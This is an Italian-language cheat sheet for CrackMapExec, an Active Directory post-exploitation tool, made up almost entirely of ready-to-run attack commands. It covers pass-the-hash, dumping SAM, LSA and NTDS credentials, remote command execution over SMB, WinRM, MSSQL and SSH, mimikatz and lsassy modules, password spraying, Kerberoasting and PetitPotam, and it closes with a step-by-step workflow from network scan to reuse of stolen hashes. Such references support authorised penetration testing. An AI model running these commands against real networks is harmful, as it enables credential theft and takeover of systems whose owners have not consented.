# 🗡️ CrackMapExec - AD Swiss Army Knife

```
   ██████╗███╗   ███╗███████╗
  ██╔════╝████╗ ████║██╔════╝
  ██║     ██╔████╔██║█████╗  
  ██║     ██║╚██╔╝██║██╔══╝  
  ╚██████╗██║ ╚═╝ ██║███████╗
   ╚═════╝╚═╝     ╚═╝╚══════╝
   CrackMapExec - Un coltellino svizzero per il Pentesting
```

<p align="center">
  <img src="https://img.shields.io/badge/CrackMapExec-Active_Directory-red?style=for-the-badge" alt="CME">
  <img src="https://img.shields.io/badge/SMB-blue?style=for-the-badge" alt="SMB">
  <img src="https://img.shields.io/badge/WinRM-green?style=for-the-badge" alt="WinRM">
</p>

---

## 📋 Indice

* [Cos'è CrackMapExec](#-cosè-crackmapexec)
* [Installazione](#-installazione)
* [Protocollo SMB](#-protocollo-smb)
* [Protocollo WinRM](#-protocollo-winrm)
* [Protocollo LDAP](#-protocollo-ldap)
* [Protocollo MSSQL](#-protocollo-mssql)
* [Protocollo SSH](#-protocollo-ssh)
* [Moduli](#-moduli)
* [Password Spray](#-password-spray)
* [Riferimento Rapido](#-riferimento-rapido)

---

## 🎯 Cos'è CrackMapExec

**CrackMapExec** (CME) è un tool di post-exploitation per il network assessment. Supporta:

* 🖥️ **SMB** - Share, sessioni, esecuzione
* 🔧 **WinRM** - PowerShell remoting
* 📂 **LDAP** - AD enumeration
* 🗄️ **MSSQL** - Attacchi a SQL Server
* 🐧 **SSH** - Target Linux
* 💉 **Pass-the-Hash** - Riuso delle credenziali

### Caratteristiche

| Feature | Descrizione |
| --- | --- |
| **Multi-protocollo** | SMB, WinRM, LDAP, MSSQL, SSH |
| **Esecuzione parallela** | Attacca target multipli simultaneamente |
| **Credential DB** | Database per tracciare le credenziali compromesse |
| **Moduli** | Estensibile con moduli personalizzati |
| **Formati di output** | Molteplici opzioni di visualizzazione e log |

---

## 🚀 Installazione

### Kali Linux

```bash
# Installa con apt
sudo apt update
sudo apt install crackmapexec

# Oppure con pipx (raccomandato)
pipx install crackmapexec
```

### Usando pipx

```bash
# Installa prima pipx
sudo apt install pipx
pipx ensurepath

# Installa CME
pipx install crackmapexec
```

### Verifica

```bash
crackmapexec --help
crackmapexec smb --help
```

---

## 🖥️ Protocollo SMB

### Enumeration di Base

```bash
# Verifica se gli host sono attivi
cme smb 10.10.10.0/24

# Enumeration con credenziali
cme smb 10.10.10.10 -u user -p password

# Autenticazione di dominio
cme smb 10.10.10.10 -u user -p password -d domain.local

# Autenticazione locale
cme smb 10.10.10.10 -u administrator -p password --local-auth
```

### Pass-the-Hash

```bash
# SMB con hash NTLM
cme smb 10.10.10.10 -u user -H NTLMHASH

# Hash completo LM:NTLM
cme smb 10.10.10.10 -u user -H LM:NTLM

# Spray dell'hash sulla rete
cme smb 10.10.10.0/24 -u administrator -H NTLMHASH --local-auth
```

### Enumeration delle Share

```bash
# Elenca le share
cme smb 10.10.10.10 -u user -p password --shares

# Scansione ricorsiva (Spidering) delle share
cme smb 10.10.10.10 -u user -p password --spider C$ --pattern txt

# Elenca i file ricorsivamente
cme smb 10.10.10.10 -u user -p password --spider-folder /path --depth 3
```

### Enumeration Utenti

```bash
# Elenca utenti con RPC
cme smb 10.10.10.10 -u user -p password --users

# Elenca gruppi
cme smb 10.10.10.10 -u user -p password --groups

# Elenca utenti loggati
cme smb 10.10.10.10 -u user -p password --loggedon-users

# Ottieni i SID utenti
cme smb 10.10.10.10 -u user -p password --rid-brute
```

### Esecuzione Comandi

```bash
# Esegui comando
cme smb 10.10.10.10 -u admin -p password -x "whoami"

# Esecuzione PowerShell
cme smb 10.10.10.10 -u admin -p password -X "Get-Process"

# Metodi di esecuzione differenti
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method smbexec
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method wmiexec
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method atexec
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method mmcexec
```

### Dump delle Credenziali

```bash
# Dump del SAM
cme smb 10.10.10.10 -u admin -p password --sam

# Dump LSA secrets
cme smb 10.10.10.10 -u admin -p password --lsa

# Dump NTDS.dit (richiede Domain Admin su DC)
cme smb DC01.domain.local -u admin -p password --ntds

# Dump NTDS con metodo specifico
cme smb DC01 -u admin -p password --ntds drsuapi
cme smb DC01 -u admin -p password --ntds vss
```

### Firma SMB

```bash
# Verifica firma SMB (per attacchi Relay)
cme smb 10.10.10.0/24 --gen-relay-list relay.txt
```

---

## 🔧 Protocollo WinRM

### Utilizzo di Base

```bash
# Verifica accesso WinRM
cme winrm 10.10.10.10 -u user -p password

# Verifica target multipli
cme winrm 10.10.10.0/24 -u user -p password

# Con hash
cme winrm 10.10.10.10 -u user -H NTLMHASH
```

### Esecuzione Comandi

```bash
# Esegui comando
cme winrm 10.10.10.10 -u admin -p password -x "whoami"

# PowerShell
cme winrm 10.10.10.10 -u admin -p password -X "Get-Process"

# Esegui script
cme winrm 10.10.10.10 -u admin -p password -X '$PSVersionTable'
```

### Dump delle Credenziali

```bash
# Dump SAM con WinRM
cme winrm 10.10.10.10 -u admin -p password --sam

# Dump LSA secrets
cme winrm 10.10.10.10 -u admin -p password --lsa
```

---

## 📂 Protocollo LDAP

### Enumeration

```bash
# Query LDAP di base
cme ldap DC01.domain.local -u user -p password

# Elenca utenti
cme ldap DC01 -u user -p password --users

# Elenca gruppi
cme ldap DC01 -u user -p password --groups

# Utenti vulnerabili ad AS-REP roasting
cme ldap DC01 -u user -p password --asreproast asrep.txt

# Utenti vulnerabili a Kerberoasting
cme ldap DC01 -u user -p password --kerberoasting kerb.txt
```

### Password Policy

```bash
# Ottieni la password policy
cme ldap DC01 -u user -p password --password-policy
```

### Attributi Utente

```bash
# Ottieni descrizioni utenti
cme ldap DC01 -u user -p password -M get-desc-users

# Ottieni attributi specifici
cme ldap DC01 -u user -p password --admin-count
```

---

## 🗄️ Protocollo MSSQL

### Utilizzo di Base

```bash
# Connessione a MSSQL
cme mssql 10.10.10.10 -u sa -p password

# Autenticazione Windows
cme mssql 10.10.10.10 -u user -p password -d domain.local

# Con hash
cme mssql 10.10.10.10 -u user -H NTLMHASH -d domain.local
```

### Esecuzione Comandi

```bash
# Esecuzione con xp_cmdshell
cme mssql 10.10.10.10 -u sa -p password -x "whoami"

# Abilita xp_cmdshell
cme mssql 10.10.10.10 -u sa -p password --enable-xp

# Query SQL
cme mssql 10.10.10.10 -u sa -p password -q "SELECT @@version"
```

---

## 🐧 Protocollo SSH

### Utilizzo di Base

```bash
# Verifica SSH
cme ssh 10.10.10.10 -u root -p password

# Target multipli
cme ssh 10.10.10.0/24 -u user -p password

# Con file chiave
cme ssh 10.10.10.10 -u user --key-file id_rsa
```

### Esecuzione Comandi

```bash
# Esegui comando
cme ssh 10.10.10.10 -u root -p password -x "id"

# Comandi multipli
cme ssh 10.10.10.10 -u root -p password -x "cat /etc/passwd"
```

---

## 🧩 Moduli

### Elenco Moduli

```bash
# Elenca tutti i moduli
cme smb -L
cme winrm -L
cme ldap -L

# Help del modulo
cme smb -M mimikatz --options
```

### Moduli Popolari

```bash
# Mimikatz
cme smb 10.10.10.10 -u admin -p password -M mimikatz

# Lsassy (dump LSASS)
cme smb 10.10.10.10 -u admin -p password -M lsassy

# WebDAV
cme smb 10.10.10.10 -u admin -p password -M webdav

# Petitpotam
cme smb 10.10.10.10 -u user -p password -M petitpotam

# GPP password
cme smb DC01 -u user -p password -M gpp_password

# GPP AutoLogon
cme smb DC01 -u user -p password -M gpp_autologin

# Spider Plus
cme smb 10.10.10.10 -u user -p password -M spider_plus
```

### Bloodhound Collection

```bash
# Colleziona dati per BloodHound
cme ldap DC01 -u user -p password --bloodhound -ns DC01 -c All
```

---

## 🔓 Spray Password

### Spraying di Base

```bash
# Password singola contro una lista utenti
cme smb 10.10.10.10 -u users.txt -p 'Password123!' --continue-on-success

# Password multiple
cme smb 10.10.10.10 -u users.txt -p passwords.txt --continue-on-success

# Prova ogni combinazione singolarmente
cme smb 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce
```

### Spray su Rete

```bash
# Spray sull'intera rete
cme smb 10.10.10.0/24 -u user -p 'Password123!' --continue-on-success

# Da file di target
cme smb targets.txt -u admin -p password --continue-on-success
```

### Lockout Awareness

```bash
# Verifica sempre la password policy prima di iniziare
cme ldap DC01 -u user -p password --password-policy

# Output esempio:
# Lockout threshold: 5
# Lockout duration: 30 minutes
```

---

## 💾 Database

### CME Database

```bash
# Visualizza le credenziali salvate
cmedb

# Comandi interni a cmedb:
creds           # Elenca credenziali salvate
hosts           # Elenca host scansionati
```

### Esportazione Dati

```bash
# Formati di log
cme smb 10.10.10.10 -u user -p password --log log.txt

# Output JSON
cme smb 10.10.10.10 -u user -p password --json
```

---

## 📊 Riferimento rapido

### Metodi di Autenticazione

| Metodo | Opzione |
| --- | --- |
| Password | `-p password` |
| NTLM Hash | `-H HASH` |
| AES Key | `--aesKey KEY` |
| Kerberos | `-k` |
| Local Auth | `--local-auth` |

### Protocolli

| Protocollo | Porta | Caso d'Uso |
| --- | --- | --- |
| SMB | 445 | Share file, esecuzione |
| WinRM | 5985/5986 | PowerShell remoting |
| LDAP | 389/636 | Enumeration AD |
| MSSQL | 1433 | Server SQL |
| SSH | 22 | Sistemi Linux |

### Flag Comuni

| Flag | Descrizione |
| --- | --- |
| `-u` | Username (o file) |
| `-p` | Password (o file) |
| `-H` | Hash NTLM |
| `-d` | Dominio |
| `-x` | Comando (cmd) |
| `-X` | Comando (PowerShell) |
| `--shares` | Elenca share |
| `--users` | Elenca utenti |
| `--sam` | Dump SAM |
| `--lsa` | Dump LSA |
| `--ntds` | Dump NTDS |

### Marker di Output

| Marker | Significato |
| --- | --- |
| `[+]` | Successo |
| `[-]` | Fallimento |
| `[*]` | Info |
| `(Pwn3d!)` | Accesso Admin confermato |

### Workflow Tipico

```bash
# 1. Scansione rete
cme smb 10.10.10.0/24

# 2. Password spray
cme smb 10.10.10.0/24 -u users.txt -p 'Summer2024!' --continue-on-success

# 3. Verifica privilegi admin
cme smb 10.10.10.0/24 -u user -p password

# 4. Dump delle credenziali
cme smb 10.10.10.10 -u admin -p password --sam --lsa

# 5. Riuso delle credenziali trovate
cme smb 10.10.10.0/24 -u newuser -H NEWHASH
```

---

## 📚 Risorse

* [CrackMapExec GitHub](https://github.com/Porchetta-Industries/CrackMapExec)
* [CrackMapExec Wiki](https://wiki.porchetta.industries/)

### Cheatsheet Correlate

* [BloodHound](../BloodHound/translations/README.it.md)
* [Impacket](../Impacket/translations/README.it.md)
* [Mimikatz](../Mimikatz/translations/README.it.md)

---

<p align="center">
  <b>🗡️ Own the Network!</b>
  <i>CrackMapExec - Il coltellino svizzero del pentester</i>
</p>
